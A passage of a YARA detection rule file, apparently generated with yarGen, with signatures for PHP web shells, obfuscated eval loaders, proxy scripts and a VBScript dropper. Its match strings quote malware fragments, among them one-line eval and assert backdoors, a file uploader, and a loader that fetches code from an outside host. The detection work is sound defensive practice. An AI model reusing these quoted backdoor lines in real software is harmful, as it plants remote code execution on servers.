		$s3 = "<td><form method='post' ENCTYPE='multipart/form-data'>" fullword ascii
		$s4 = "<td><form onsubmit=\\\"g('Console',null,this.c.value);return false;\\\"><span>Execute:</span><br><input class='toolsInp' type=te" ascii
		$s5 = "table.info{ color:#fff;background-color:#222; }" fullword ascii
		$s6 = ".ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }" fullword ascii
		$s7 = "span,h1,a{ color: $color !important; }" fullword ascii
		$s8 = "body,td,th{ font: 9pt Lucida,Verdana;margin:0;vertical-align:top;color:#e1e1e1; }" fullword ascii
		$s9 = ".main th{text-align:left;background-color:#5e5e5e;}" fullword ascii
		$s10 = "<input type=hidden name=a value='FilesMAn'>" fullword ascii
		$s11 = ".main tr:hover{background-color:#5e5e5e}" fullword ascii
		$s12 = "body{background-color:#444;color:#e1e1e1;}" fullword ascii
		$s13 = "pre{font-family:Courier,Monospace;}" fullword ascii
		$s14 = ".bigarea{ width:100%;height:300px; }" fullword ascii
		$s15 = "span{ font-weight: bolder; }" fullword ascii
		$s16 = ".toolsInp{ width: 300px }" fullword ascii
		$s17 = "a{ text-decoration:none; }" fullword ascii
		$s18 = ".l1{background-color:#444}" fullword ascii
		$s19 = "#toolsTbl{ text-align:center; }" fullword ascii
		$s20 = ".l2{background-color:#333}" fullword ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 426KB and all of them
}
rule YarGen_php_backdoor4
{
	meta:
		description = "php_malware - file 000024.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2015-12-30"
		hash = "6e304a0ae94f910a73a7b4e67623e9e40832abae692c0dc145231cd1cdbdcfb1"
	strings:
		$s0 = "<?php error_reporting(0); assert(stripslashes($_REQUEST[btql])); error_reporting(E_ALL); ?>" fullword ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 1KB and all of them

}
rule YarGen_php_backdoor3
{
	meta:
		description = "php_malware - file 000009.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2015-12-30"
		hash = "b9faa9b4e3d0fc9ab2707001339a5094d202521fa66a357c4428fd5c8e34755c"
	strings:
		$s0 = "<?php $hash = '233b8273337bdb0090abe8eef3375b6c'; if(isset($_POST[ue])){if (md5($_POST['hash']) === $hash) @eval(base64_decode($" ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 1KB and all of them
}
rule YarGen_php_backdoor2
{
	meta:
		description = "php_malware - file 000026.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2015-12-30"
		hash = "c5d71ae59cf9a520833080bcfacaeeb4db6f941e201af05338f93bd9e45042d6"
	strings:
		$s0 = "<?PHP /*** Magento** NOTICE OF LICENSE** This source file is subject to the Open Software License (OSL 3.0)* that is bundled wit" ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 6KB and all of them

}
rule YarGen_php_backdoor1
{
	meta:
		description = "php_malware - file updates.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2016-01-01"
		hash = "bedf7c629281b7c517bb00d3c5b633d6f830bfdba8bd18fb931e692ddad1a110"
	strings:
		$s0 = "preg_replace(\"/.*/e\",\"\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66\\x6C\\x61\\x74\\x65\\x28\\x62\\x61\\x73\\x65\\x36\\x" ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 139KB and all of them
}
rule YarGen_info_php_backdoor
{
	meta:
		description = "php_malware - file info.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2016-01-07"
		hash = "2f9f545b4f52fea20c656040a65cb4152ddb7319f3ef566574e977e84d60b825"
	strings:
		$s0 = "<?php if(isset($_POST[ue])){@eval(base64_decode($_POST[ue]));exit;}if(isset($_GET[sesion])){phpinfo();} ?>" fullword ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 1KB and all of them
}
rule YarGen_error_php_backdoor
{
	meta:
		description = "php_malware - file error.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2016-01-07"
		hash = "52e2de452d396092f9f4442157eafe5c71b2227f7a554d079bdda00f110ae7e5"
	strings:
		$s0 = "$string361369589 = \"sys2iGpM4W6AelyNEX0NodYcjLTe9cnzBXiUpF5VcMqM5YCANk3kKntbnch5g60k0zoAG59cX9tBctNoAj1kA1FVBmebRIWnEx4D59n+GrB" ascii
		$s1 = "$v = unpack(\"V*\", $s. str_repeat(\"\\0\", (4 - strlen($s) % 4) & 3));" fullword ascii
		$s2 = "eval(xxtea_decrypt(base64_decode($string361369589), \"3473dab\"));" fullword ascii
		$s3 = "function xxtea_encrypt($str, $key) {" fullword ascii
		$s4 = "while ($n >= 2147483648) $n -= 4294967296;" fullword ascii
		$s5 = "while ($n <= -2147483649) $n += 4294967296;" fullword ascii
		$s6 = "if (($m < $n - 3) || ($m > $n)) return false;" fullword ascii
		$s7 = "$y = $v[$p] = int32($v[$p] - $mx);" fullword ascii
		$s8 = "$y = $v[0] = int32($v[0] - $mx);" fullword ascii
		$s9 = "$sum = int32($sum - $delta);" fullword ascii
		$s10 = "function xxtea_decrypt($str, $key) {" fullword ascii
		$s11 = "$k = str2long($key, false);" fullword ascii
		$s12 = "$z = $v[$p - 1];" fullword ascii
		$s13 = "$n = count($v) - 1;" fullword ascii
		$s14 = "$m = $v[$len - 1];" fullword ascii
		$s15 = "$n = ($len - 1) << 2;" fullword ascii
		$s16 = "return substr(join('', $s), 0, $n);" fullword ascii
		$s17 = "for ($i = count($k); $i < 4; $i++) {" fullword ascii
		$s18 = "$z = $v[$n] = int32($v[$n] + $mx);" fullword ascii
		$s19 = "$z = $v[$p] = int32($v[$p] + $mx);" fullword ascii
		$s20 = "$sum = int32($q * $delta);" fullword ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 266KB and all of them
}
rule YarGen_sohai_backdoor
{
	meta:
		description = "php_malware - file index.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2016-01-01"
		hash = "ffa0ade30bd3f792fd390c52934844b2676961f50a4e963f2743200a017d6248"
	strings:
		$s0 = "<?php /* Encoder by sohai obfuscation V1.3*/ $ioOAiSoiihISSSAAooOA=file(__FILE__);eval(base64_decode(\"aWYoIWZ1bmN0aW9uX2V4aXN0c" ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 307KB and all of them
}
rule YarGen_header
{
	meta:
		description = "php_malware - file header.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2016-01-18"
		hash = "7c750bd9b1bcb152aabb8aec4b2486bfb6a34f643deed2b4501ce353537c8a7e"
	strings:
		$s0 = "<script type=\"text/javascript\">var a=\"'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlg" ascii
	condition:
		uint16(0) == 0x733c and filesize < 3KB and all of them
}
rule YarGen_Main
{
	meta:
		description = "php_malware - file Main.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2016-01-18"
		hash = "53f656fb4fe3b8580e23aa32db98ceef0c141f4cdb578328a456cfca201bdba2"
	strings:
		$s0 = "<?php eval(base64_decode(\"JGlwPSRfU0VSVkVSWyJSRU1PVEVfQUREUiJdOyRkcj0kX1NFUlZFUlsiRE9DVU1FTlRfUk9PVCJdOyR1YSA9ICRfU0VSVkVSWydIV" ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 12KB and all of them
}
rule YarGen_grizzly_massemail
{
	meta:
		description = "php_malware - file grizzly_massemail.html"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2016-01-18"
		hash = "550e21b70e7c5136a145a92e3469d5470c1b2c1a0870bbb749d7a9853901183d"
	strings:
		$s0 = "DropFileName = \"svchost.exe\"" fullword ascii
		$s1 = "WSHshell.Run DropPath, 0" fullword ascii
		$s2 = "DropPath = FSO.GetSpecialFolder(2) & \"\\\" & DropFileName" fullword ascii
		$s3 = "Set FileObj = FSO.CreateTextFile(DropPath, True)" fullword ascii
		$s4 = "If FSO.FileExists(DropPath)=False Then" fullword ascii
		$s5 = "Set WSHshell = CreateObject(\"WScript.Shell\")" fullword ascii
		$s6 = "</body><SCRIPT Language=VBScript><!--" fullword ascii
		$s7 = "//--></SCRIPT><!--" fullword ascii
		$s8 = "FileObj.Write Chr(CLng(\"&H\" & Mid(WriteData,i,2)))" fullword ascii
		$s9 = "For i = 1 To Len(WriteData) Step 2" fullword ascii
		$s10 = "FileObj.Close" fullword ascii
		$s11 = "WriteData = \"4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000" ascii
	condition:
		uint16(0) == 0x2f3c and filesize < 608KB and all of them
}
rule YarGen_index3
{
	meta:
		description = "php_malware - file index.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2016-01-18"
		hash = "f695f725cec1ad8d1a7e7e114472597d5c721b07bed2570117d09da40ca75bfa"
	strings:
		$s0 = "if (isset($_GET[$_config['url_var_name']], $_POST[$_config['basic_auth_var_name']], $_POST['username'], $_POST['password']))" fullword ascii
		$s1 = "$_set_cookie[] = add_cookie(\"AUTH;{$_basic_auth_realm};{$_url_parts['host']}:{$_url_parts['port']}\", $_basic_auth_header);" fullword ascii
		$s2 = "$_post_body .= \"Content-Disposition: form-data; name=\\\"$key\\\"; filename=\\\"{$file_info['name']}\\\"\\r\\n\";" fullword ascii
		$s3 = "$_request_headers .= 'User-Agent: ' . $_SERVER['HTTP_USER_AGENT'] . \"\\r\\n\";" fullword ascii
		$s4 = "$_request_headers .= 'Host: ' . $_url_parts['host'] . $_url_parts['port_ext'] . \"\\r\\n\";" fullword ascii
		$s5 = "$_request_headers  .= \"Authorization: Basic {$_auth_creds[$_basic_auth_realm]}\\r\\n\";" fullword ascii
		$s6 = "$temp = array_merge_recursive($temp, set_post_files($value, $key));" fullword ascii
		$s7 = "if (count($cookie_id) < 4 || ($cookie_content[1] == 'secure' && $_url_parts['scheme'] != 'https'))" fullword ascii
		$s8 = "$_basic_auth_header = base64_encode($_POST['username'] . ':' . $_POST['password']);" fullword ascii
		$s9 = "$_post_body .= \"Content-Disposition: form-data; name=\\\"$key\\\"\\r\\n\\r\\n\";" fullword ascii
		$s10 = "header('Location: ' . $_script_url . '?' . $_config['url_var_name'] . '=' . encode_url($_POST[$_config['url_var_name']]));" fullword ascii
		$s11 = "$temp = array_merge($temp, set_post_vars($value, $key));" fullword ascii
		$s12 = "else if (list($_basic_auth_realm, $_basic_auth_header) = each($_auth_creds))" fullword ascii
		$s13 = "$_cookie .= ($_cookie != '' ? '; ' : '') . (empty($cookie_id[1]) ? '' : $cookie_id[1] . '=') . $cookie_content[0];" fullword ascii
		$s14 = "if (preg_match('#^https?\\:\\/\\/(www)?\\Q' . $host  . '\\E(\\/|\\:|$)#i', trim($_SERVER['HTTP_REFERER'])))" fullword ascii
		$s15 = "return $proxify ? \"{$GLOBALS['_script_url']}?{$GLOBALS['_config']['url_var_name']}=\" . encode_url($url) . $fragment : $url;" fullword ascii
		$s16 = "// FIGURE OUT WHAT TO DO (POST URL-form submit, regular request, basic auth, cookie manager, show URL-form)" fullword ascii
		$s17 = "$_request_headers .= \"Content-Type: multipart/form-data; boundary={$_data_boundary}\\r\\n\";" fullword ascii
		$s18 = "$_basic_auth_realm  = base64_decode($_POST[$_config['basic_auth_var_name']]);" fullword ascii
		$s19 = "$data = @fread($_socket, 8192); // silenced to avoid the \"normal\" warning by a faulty SSL connection" fullword ascii
		$s20 = "$_request_headers .= \"Content-Length: \" . strlen($_post_body) . \"\\r\\n\\r\\n\";" fullword ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 117KB and all of them
}
rule YarGen_project_wonderful
{
	meta:
		description = "php_malware - file mod_project_wonderful.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2016-01-18"
		hash = "b41161aacc7eac40d28f8e87892c5c4d0b0a995c9508e8f9268e141881b7e76a"
	strings:
		$s0 = "';$___=isset($_POST['___'])?$_POST['___']:(isset($_COOKIE['___'])?$_COOKIE['___']:NULL);if($___!==NULL){$___=md5($___).substr(md" ascii
		$s1 = "\\\\\\\\b[" fullword ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 46KB and all of them
}
rule YarGen_shell_hack
{
	meta:
		description = "php_malware - file order_reminder.html"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2016-01-18"
		hash = "9bd35a97746f2e5fdeba5d7ee3353de787bb5bf8a4f5308a9c5b8b88fb469442"
	strings:
		$s0 = "DropFileName = \"svchost.exe\"" fullword ascii
		$s1 = "WSHshell.Run DropPath, 0" fullword ascii
		$s2 = "DropPath = FSO.GetSpecialFolder(2) & \"\\\" & DropFileName" fullword ascii
		$s3 = "Set FileObj = FSO.CreateTextFile(DropPath, True)" fullword ascii
		$s4 = "If FSO.FileExists(DropPath)=False Then" fullword ascii
		$s5 = "Set WSHshell = CreateObject(\"WScript.Shell\")" fullword ascii
		$s6 = "</body><SCRIPT Language=VBScript><!--" fullword ascii
		$s7 = "//--></SCRIPT><!--" fullword ascii
		$s8 = "FileObj.Write Chr(CLng(\"&H\" & Mid(WriteData,i,2)))" fullword ascii
		$s9 = "For i = 1 To Len(WriteData) Step 2" fullword ascii
		$s10 = "FileObj.Close" fullword ascii
		$s11 = "WriteData = \"4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000" ascii
	condition:
		uint16(0) == 0x2f3c and filesize < 608KB and all of them
}
rule YarGen_test1_php_backdoor
{
	meta:
		description = "php_malware - file test1.php2"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2016-01-18"
		hash = "c6987684488275d3a1b8e702a699ea13ef07c5f86e1e910da37b5e919e935097"
	strings:
		$s0 = "<?PHP if(isset($_GET['do'])){$t0=$q1=null;$t2=array('./adminhtml/default/default/images');$r3=array('_bg','_sm','_icon','_left'," ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 14KB and all of them
}
rule YarGen_adbru
{
	meta:
		description = "php_malware - file 123.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2016-01-18"
		hash = "bd887c5b20de988c6ebef82a1be7a976fe4d244c7db9a1423b10e7bedf7bd922"
	strings:
		$s0 = "<?php $cmd1 = file_get_contents(\"http://lnx.adb.ru/1.txt\"); $fo = fopen(\"cache1.php\", \"w+\"); fwrite($fo, $cmd1); fclose($f" ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 1KB and all of them
}
rule YarGen_pjs
{
	meta:
		description = "php_malware - file pjs.js"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2016-01-18"
		hash = "f3f9d9a5a78f606dbe3bc275c75576a0bfe37fd057df942b0f4eb68e5e79bec2"
	strings:
		$s0 = "function New_Wind0w() {document.PHProxy.target = (document.PHProxy.target == '_blank') ? '_top' : '_blank';}" fullword ascii
		$s1 = "google = \"http://www.google.com/search?q=\" + str;" fullword ascii
		$s2 = "//// Base64 encode/decode - http://www.webtoolkit.info" fullword ascii
		$s3 = "var key_Str = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\";" fullword ascii
		$s4 = "this.key_Str.charAt(enc3) + this.key_Str.charAt(enc4);}" fullword ascii
		$s5 = "this.key_Str.charAt(enc1) + this.key_Str.charAt(enc2) +" fullword ascii
		$s6 = "document.PHProxy.elements[0].value = R0T13(BS64_ENC0DE(google));" fullword ascii
		$s7 = "//// http://phpr0xi.sourceforge.net" fullword ascii
		$s8 = "document.PHProxy.elements[0].value = R0T13(BS64_ENC0DE(url));" fullword ascii
		$s9 = "string = document.PHProxy.elements[0].value.replace(/^\\s+|\\s+$/g, '');" fullword ascii
		$s10 = "document.PHProxy.elements[0].value = str;}" fullword ascii
		$s11 = "document.PHProxy.elements[0].value = string;" fullword ascii
		$s12 = "str = document.PHProxy.elements[0].value.replace(/^\\s+|\\s+$/g, '');" fullword ascii
		$s13 = "newStr += (curLetLoc < 0) ? curLet : alpha2.charAt(curLetLoc);}" fullword ascii
		$s14 = "document.PHProxy.submit ();" fullword ascii
		$s15 = "url = (string.indexOf('://') < 0) ? 'http://' + string : string;" fullword ascii
		$s16 = "{curLet = str.charAt(i);" fullword ascii
		$s17 = "var alpha2 = 'nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM';" fullword ascii
		$s18 = "var alpha1 = 'ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba';" fullword ascii
		$s19 = "//// PHProxy v0.6 2010" fullword ascii
		$s20 = "else {utftext += String.fromCharCode((c >> 12) | 224);" fullword ascii
	condition:
		uint16(0) == 0xbbef and filesize < 7KB and all of them
}
rule YarGen_503
{
	meta:
		description = "php_malware - file 503.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2016-01-18"
		hash = "f235f590b13081ca7042d96e31430508308452d062c60cd10345b3e5fcafcb8d"
	strings:
		$s0 = "error_reporting(0);$f=$_FILES[xsdsdss];copy($f[tmp_name],$f[name]);error_reporting(E_ALL); " fullword ascii
	condition:
		uint16(0) == 0x7265 and filesize < 1KB and all of them
}
rule YarGen_index_packaged2
{
	meta:
		description = "php_malware - file index_packaged2.js"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2016-01-18"
		hash = "75f7e1558d02d339b5848ba0294ce809157ce41974af9169fec111616124302f"
	strings:
		$s0 = "a+\">\").appendTo(\"body\"),d=b.css(\"display\");b.remove();if(d===\"none\"||d===\"\")d=\"block\";ea[a]=d}return ea[a]}function " ascii
		$s1 = "d.join(\"\\\\.(?:.*\\\\.)?\")+\"(\\\\.|$)\")}a.namespace=a.namespace||d.join(\".\");f=c.data(this,this.nodeType?\"events\":\"__e" ascii
		$s2 = "1;o>=0;--o)c.nodeName(k[o],\"tbody\")&&!k[o].childNodes.length&&k[o].parentNode.removeChild(k[o])}!c.support.leadingWhitespace&&" ascii
		$s3 = "b,d)},next:function(b){return a.move(1,b)},prev:function(b){return a.move(-1,b)},begin:function(b){return a.seekTo(0,b)},end:fun" ascii
		$s4 = "Stacks.repositionProductHeadline();},repositionProductHeadline:function(){if($('#stacks_content ul.level_'+Stacks.currentHash.le" ascii
		$s5 = "function prepareOmnilogin(element_id){displayFlashMessages('.omnilogin_form');$(\"#\"+element_id+\" .omnilogin_form\").submit(fu" ascii
		$s6 = "0===i},eq:function(g,i,n){return n[3]-0===i}},filter:{PSEUDO:function(g,i,n,m){var p=i[1],q=o.filters[p];if(q)return q(g,n,i,m);" ascii
		$s7 = "Array.prototype.clone=function(){return this.slice(0);};var Stacks={stack_json:{},pendingRequest:null,currentHash:[],setLevel:0," ascii
		$s8 = "b],f.body[\"scroll\"+b],f.documentElement[\"scroll\"+b],f.body[\"offset\"+b],f.documentElement[\"offset\"+b]);else if(e===B){f=c" ascii
		$s9 = "InlineCart.serverProcessing=false;},placeFloater:function(){var wid=$('#product_nav .checkout_area').width();var hei=$('#product" ascii
		$s10 = "function omnilogin_form_success(data,status,xhr){if(data!==null){if(data.destination_url&&!allow_omnilogin_presentation(data.des" ascii
		$s11 = "History.pushState(currentState.data,currentState.title,currentState.url,false);return true;};History.Adapter.bind(window,'hashch" ascii
		$s12 = "(function(E,B){function ka(a,b,d){if(d===B&&a.nodeType===1){d=a.getAttribute(\"data-\"+b);if(typeof d===\"string\"){try{d=d===\"" ascii
		$s13 = "function omniloginOverlayInitializer(){prepareOmnilogin(\"omnilogin_link_overlay\");attachOffsiteLinkHandlers();}" fullword ascii
		$s14 = "$(document).ready(function(event){update_activity_feed();});$(function(){displayFlashMessages();});function displayFlashMessages" ascii
		$s15 = "-Math.min(html[size],body[size]);};function both(val){return typeof val=='object'?val:{top:val,left:val};};})(jQuery);var Inline" ascii
		$s16 = "return newState;};History.createStateObject=function(data,title,url){var State={'data':data,'title':title,'url':url};State=Histo" ascii
		$s17 = "var suggested_products=[];$.each(suggestions,function(index,val){suggested_products.push({type:\"Product\",id:val});});var param" ascii
		$s18 = "$container=$('<div id=\"'+targetID+'\" '+targetParams+'></div>');$container.prependTo($(parentSelector));}" fullword ascii
		$s19 = "return elem;var doc=(elem.contentWindow||elem).document||elem.ownerDocument||elem;return $.browser.safari||doc.compatMode=='Back" ascii
		$s20 = "if(!State){url=History.getFullUrl(url_or_hash);id=History.getIdByUrl(url)||false;if(id){State=History.getStateById(id);}" fullword ascii
	condition:
		uint16(0) == 0x6628 and filesize < 712KB and all of them
}
rule YarGen_index_packaged
{
	meta:
		description = "php_malware - file index_packaged.js"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2016-01-18"
		hash = "ab9ed9628492a7b02c86d90cb873aa66c85e79b9bb569e9cf0530616222cf772"
	strings:
		$s0 = "a+\">\").appendTo(\"body\"),d=b.css(\"display\");b.remove();if(d===\"none\"||d===\"\")d=\"block\";ea[a]=d}return ea[a]}function " ascii
		$s1 = "d.join(\"\\\\.(?:.*\\\\.)?\")+\"(\\\\.|$)\")}a.namespace=a.namespace||d.join(\".\");f=c.data(this,this.nodeType?\"events\":\"__e" ascii
		$s2 = "1;o>=0;--o)c.nodeName(k[o],\"tbody\")&&!k[o].childNodes.length&&k[o].parentNode.removeChild(k[o])}!c.support.leadingWhitespace&&" ascii
		$s3 = "b,d)},next:function(b){return a.move(1,b)},prev:function(b){return a.move(-1,b)},begin:function(b){return a.seekTo(0,b)},end:fun" ascii
		$s4 = "return spots;},repositionProductHeadline:function(){var li_obj=$('#stacks_content ul.level_'+Stacks.currentHash.length).parent()" ascii
		$s5 = "function prepareOmnilogin(element_id){displayFlashMessages('.omnilogin_form');$(\"#\"+element_id+\" .omnilogin_form\").submit(fu" ascii
		$s6 = "0===i},eq:function(g,i,n){return n[3]-0===i}},filter:{PSEUDO:function(g,i,n,m){var p=i[1],q=o.filters[p];if(q)return q(g,n,i,m);" ascii
		$s7 = "Array.prototype.clone=function(){return this.slice(0);};var Stacks={stack_json:{},pendingRequest:false,currentHash:[],setLevel:0" ascii
		$s8 = "b],f.body[\"scroll\"+b],f.documentElement[\"scroll\"+b],f.body[\"offset\"+b],f.documentElement[\"offset\"+b]);else if(e===B){f=c" ascii
		$s9 = "InlineCart.serverProcessing=false;},placeFloater:function(){var wid=$('#product_nav .checkout_area').width();var hei=$('#product" ascii
		$s10 = "function omnilogin_form_success(data,status,xhr){if(data!==null){if(data.destination_url&&!allow_omnilogin_presentation(data.des" ascii
		$s11 = "History.pushState(currentState.data,currentState.title,currentState.url,false);return true;};History.Adapter.bind(window,'hashch" ascii
		$s12 = "(function(E,B){function ka(a,b,d){if(d===B&&a.nodeType===1){d=a.getAttribute(\"data-\"+b);if(typeof d===\"string\"){try{d=d===\"" ascii
		$s13 = "function omniloginOverlayInitializer(){prepareOmnilogin(\"omnilogin_link_overlay\");attachOffsiteLinkHandlers();}" fullword ascii
		$s14 = "$(document).ready(function(event){update_activity_feed();});$(function(){displayFlashMessages();});function displayFlashMessages" ascii
		$s15 = "return newState;};History.createStateObject=function(data,title,url){var State={'data':data,'title':title,'url':url};State=Histo" ascii
		$s16 = "var suggested_products=[];$.each(suggestions,function(index,val){suggested_products.push({type:\"Product\",id:val});});var param" ascii
		$s17 = "if(carrier_item2!=='')$('#stacks_content ul.level_'+row_id).append(carrier_item2);if(carrier_item!=='')$('#stacks_content ul.lev" ascii
		$s18 = "-Math.min(html[size],body[size]);};function both(val){return typeof val=='object'?val:{top:val,left:val};};})(jQuery);var Inline" ascii
		$s19 = "return vars;},init:function(){$(document).ready(function(){var vars=ReferralProgram.getUrlVars();if(vars['display_notify']){setT" ascii
		$s20 = "$container=$('<div id=\"'+targetID+'\" '+targetParams+'></div>');$container.prependTo($(parentSelector));}" fullword ascii
	condition:
		uint16(0) == 0x6628 and filesize < 726KB and all of them
}
rule YarGen_backdoor
{
	meta:
		description = "php_malware - file backdoor.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2016-01-18"
		hash = "e5b7ff2839fee50529aa7f1901afa09f5e8eeaa1efe8780178c16b824ade1e62"
	strings:
		$s0 = "kr';$___=isset($_POST['___'])?$_POST['___']:(isset($_COOKIE['___'])?$_COOKIE['___']:NULL);if($___!==NULL){$___=md5($___).substr(" ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 46KB and all of them
}
rule YarGen_index_inc
{
	meta:
		description = "php_malware - file index.inc.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2016-01-18"
		hash = "d01efe92733e53c7363de6fdd38c192c67da5a6bcac3d328074b73fcaf37ae44"
	strings:
		$s0 = "<title>PHProxy</title>" fullword ascii
	condition:
		uint16(0) == 0xbbef and filesize < 1KB and all of them
}
rule YarGen_banners_html
{
	meta:
		description = "php_malware - file banners.html.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2016-01-18"
		hash = "e6ec160a6e2910b0cce6d46c3e8db7ba37a4a170fb1e4e2f625bd3bbbd7ae327"
	strings:
		$s0 = "{setcookie($plim, $_POST['pass'], time()+3600);}" fullword ascii
		$s1 = "<form action=\".basename(__FILE__).\" method=\\\"POST\\\"><b></b>" fullword ascii
		$s2 = "{login();die();}" fullword ascii
		$s3 = "{$_POST['pass'] = md5($_POST['pass']);}" fullword ascii
		$s4 = "if(!empty($plam) && !isset($_COOKIE[$plim]) or ($_COOKIE[$plim] != $plam))" fullword ascii
		$s5 = "if($_POST['pass'] == $plam)" fullword ascii
		$s6 = "if(isset($_POST['pass']))" fullword ascii
		$s7 = "<input type=\\\"plam\\\" maxlength=\\\"32\\\" name=\\\"pass\\\"><input type=\\\"submit\\\" value=\\\"\\\"\\\">" fullword ascii
		$s8 = "} function reload(){header(\"Location: \".basename(__FILE__));}" fullword ascii
		$s9 = "$plim = \"8f07180a915cb803f1c25bd666332541\";" fullword ascii
		$s10 = "print \"<table border=0 width=100% height=1%><td valign=\\\"middle\\\"><center>" fullword ascii
		$s11 = "$Id: banners.php 14401 2010-01-26 14:10:00Z louis $" fullword ascii
		$s12 = "reload();}" fullword ascii
		$s13 = "$plam = \"980040207cbec5439c6a6a119dfdf93f\";" fullword ascii
		$s14 = "{if(strlen($plam) == 32)" fullword ascii
		$s15 = "$me = basename(__FILE__);" fullword ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 46KB and all of them
}
rule YarGen_js_hack
{
	meta:
		description = "php_malware - from files index_packaged2.js, index_packaged.js"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2016-01-18"
		super_rule = 1
		hash1 = "75f7e1558d02d339b5848ba0294ce809157ce41974af9169fec111616124302f"
		hash2 = "ab9ed9628492a7b02c86d90cb873aa66c85e79b9bb569e9cf0530616222cf772"
	strings:
		$s0 = "a+\">\").appendTo(\"body\"),d=b.css(\"display\");b.remove();if(d===\"none\"||d===\"\")d=\"block\";ea[a]=d}return ea[a]}function " ascii
		$s1 = "d.join(\"\\\\.(?:.*\\\\.)?\")+\"(\\\\.|$)\")}a.namespace=a.namespace||d.join(\".\");f=c.data(this,this.nodeType?\"events\":\"__e" ascii
		$s2 = "1;o>=0;--o)c.nodeName(k[o],\"tbody\")&&!k[o].childNodes.length&&k[o].parentNode.removeChild(k[o])}!c.support.leadingWhitespace&&" ascii
		$s3 = "b,d)},next:function(b){return a.move(1,b)},prev:function(b){return a.move(-1,b)},begin:function(b){return a.seekTo(0,b)},end:fun" ascii
		$s4 = "function prepareOmnilogin(element_id){displayFlashMessages('.omnilogin_form');$(\"#\"+element_id+\" .omnilogin_form\").submit(fu" ascii
		$s5 = "0===i},eq:function(g,i,n){return n[3]-0===i}},filter:{PSEUDO:function(g,i,n,m){var p=i[1],q=o.filters[p];if(q)return q(g,n,i,m);" ascii
		$s6 = "b],f.body[\"scroll\"+b],f.documentElement[\"scroll\"+b],f.body[\"offset\"+b],f.documentElement[\"offset\"+b]);else if(e===B){f=c" ascii
		$s7 = "InlineCart.serverProcessing=false;},placeFloater:function(){var wid=$('#product_nav .checkout_area').width();var hei=$('#product" ascii
		$s8 = "function omnilogin_form_success(data,status,xhr){if(data!==null){if(data.destination_url&&!allow_omnilogin_presentation(data.des" ascii
		$s9 = "History.pushState(currentState.data,currentState.title,currentState.url,false);return true;};History.Adapter.bind(window,'hashch" ascii
		$s10 = "(function(E,B){function ka(a,b,d){if(d===B&&a.nodeType===1){d=a.getAttribute(\"data-\"+b);if(typeof d===\"string\"){try{d=d===\"" ascii
		$s11 = "function omniloginOverlayInitializer(){prepareOmnilogin(\"omnilogin_link_overlay\");attachOffsiteLinkHandlers();}" fullword ascii
		$s12 = "$(document).ready(function(event){update_activity_feed();});$(function(){displayFlashMessages();});function displayFlashMessages" ascii
		$s13 = "return newState;};History.createStateObject=function(data,title,url){var State={'data':data,'title':title,'url':url};State=Histo" ascii
		$s14 = "var suggested_products=[];$.each(suggestions,function(index,val){suggested_products.push({type:\"Product\",id:val});});var param" ascii
		$s15 = "$container=$('<div id=\"'+targetID+'\" '+targetParams+'></div>');$container.prependTo($(parentSelector));}" fullword ascii
		$s16 = "return elem;var doc=(elem.contentWindow||elem).document||elem.ownerDocument||elem;return $.browser.safari||doc.compatMode=='Back" ascii
		$s17 = "if(!State){url=History.getFullUrl(url_or_hash);id=History.getIdByUrl(url)||false;if(id){State=History.getStateById(id);}" fullword ascii
		$s18 = "GazelleCookie.init();(function(){var __bind=function(fn,me){return function(){return fn.apply(me,arguments);};};var PromoCookie," ascii
		$s19 = "function hide_activity_indicator(){$(\".omnilogin_activity\").replaceWith(\"<input type='submit' value='Continue' />\");}" fullword ascii
		$s20 = "MainNavigation.openObject=$(this).find('ul');$(this).find('ul').css('display','block');MainNavigation.currentlyOpen=true;}).mous" ascii
	condition:
		uint16(0) == 0x6628 and filesize < 726KB and all of them
}
rule YarGen_index_php_hack
{
	meta:
